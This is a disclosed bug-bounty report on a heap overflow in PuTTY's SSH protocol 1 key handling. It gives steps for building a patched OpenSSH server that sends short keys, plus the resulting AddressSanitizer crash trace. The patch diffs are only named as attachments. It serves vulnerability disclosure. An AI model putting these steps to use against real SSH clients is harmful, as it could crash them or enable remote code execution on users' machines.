# Heap overflow happen when receiving short length key from ssh server using ssh protocol 1

## Report Details
- **Report ID**: 630462
- **URL**: https://hackerone.com/reports/630462
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-06-27T06:55:18.258Z
- **Disclosed**: 2019-09-20T07:19:41.032Z

## Reporter
- **Username**: hey2baby
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: putty_h1c

## Vulnerability Information
## Summary:
There's no check in `ssh1_login_process_queue` function when read `servkey` and `hostkey` length from packet which may cause heap overflow. 
Remote code execution may be possible.

## Steps To Reproduce:
  1. To test this issue, I downloaded openssl6.8 to compile to craft packets, using below command to download openssl6.8p1 source code
`# wget https://openbsd.hk/pub/OpenBSD/OpenSSH/portable/openssh-6.8p1.tar.gz`
 
  2. After download openssl6.8p1 source code, patch `ssh-keygen.c` and `sshd.c` according with `ssh-keygen.c.diff` and `sshd.c.diff` attached accordingly.

  3. Compile patched openssl6.8p1 to get `sshd` which used to act as ssh1 server and `ssh-keygen` to get host key file, using command like below
`# ./ssh-keygen -t rsa1 -b 248 -f /tmp/ssh_host_rsa1_key`
`# /root/openssh-6.8p1/sshd -p 39000 -D -E aaaa -f sshd_config -b 248`
`sshd_config` file should add protocol 1 support and specify host key file path.

  4. Download latest putty source code and compile it using address sanitize flag like below:
`# ./configure CFLAGS="-g -O0 -fsanitize=address" CPPFLAGS="-g -O0 -fsanitize=address" LDFLGAGS="-fsanitize=address"`

  5. After above 4 steps, start plink to connect like below
`# ./plink  -1 -P 39000 root@localhost`

After execution, you will see heap overflow happen immediately like below
 
>=================================================================
==24509== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60060003b96f at pc 0x45c488 bp 0x7ffc93bd3550 sp 0x7ffc93bd3548
WRITE of size 1 at 0x60060003b96f thread T0
    #0 0x45c487 (/root/putty-0.71/plink+0x45c487)
    #1 0x4ceb78 (/root/putty-0.71/plink+0x4ceb78)
    #2 0x4d23a6 (/root/putty-0.71/plink+0x4d23a6)
    #3 0x4051d5 (/root/putty-0.71/plink+0x4051d5)
    #4 0x40562e (/root/putty-0.71/plink+0x40562e)
    #5 0x53d25a (/root/putty-0.71/plink+0x53d25a)
    #6 0x7f402cfe0c04 (/usr/lib64/libc-2.17.so+0x21c04)
    #7 0x4037f8 (/root/putty-0.71/plink+0x4037f8)
0x60060003b96f is located 0 bytes to the right of 31-byte region [0x60060003b950,0x60060003b96f)
allocated by thread T0 here:
    #0 0x7f402d59b4ba (/usr/lib64/libasan.so.0+0x154ba)
    #1 0x4218b1 (/root/putty-0.71/plink+0x4218b1)
    #2 0x45bf1d (/root/putty-0.71/plink+0x45bf1d)
    #3 0x4ceb78 (/root/putty-0.71/plink+0x4ceb78)
    #4 0x4d23a6 (/root/putty-0.71/plink+0x4d23a6)
    #5 0x4051d5 (/root/putty-0.71/plink+0x4051d5)
    #6 0x40562e (/root/putty-0.71/plink+0x40562e)
    #7 0x53d25a (/root/putty-0.71/plink+0x53d25a)
    #8 0x7f402cfe0c04 (/usr/lib64/libc-2.17.so+0x21c04)
Shadow bytes around the buggy address:
  0x0c013ffff6d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c013ffff6e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c013ffff6f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c013ffff700: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c013ffff710: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c013ffff720: fa fa fa fa fd fd fd fa fa fa 00 00 00[07]fa fa
  0x0c013ffff730: 00 00 00 fa fa fa 00 00 00 fa fa fa 00 00 00 fa
  0x0c013ffff740: fa fa 00 00 00 fa fa fa fd fd fd fa fa fa 00 00
  0x0c013ffff750: 00 fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa
  0x0c013ffff760: 00 00 00 00 fa fa 00 00 00 fa fa fa 00 00 00 fa
  0x0c013ffff770: fa fa 00 00 00 fa fa fa 00 00 00 fa fa fa 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:     fa
  Heap righ redzone:     fb
  Freed Heap region:     fd
  Stack left redzone:    f1
  Stack mid redzone:     f2
  Stack right redzone:   f3
  Stack partial redzone: f4
  Stack after return:    f5
  Stack use after scope: f8
  Global redzone:        f9
  Global init order:     f6
  Poisoned by user:      f7
  ASan internal:         fe
==24509== ABORTING

  * [attachment / reference]
attachments contain `sshd.c.diff`, `ssh-keygen.c.diff` and `sshd_config`

## Impact

putty client crash or even remote code execution

## Attachments
- ssh-keygen.c.diff
- sshd.c.diff
- sshd_config
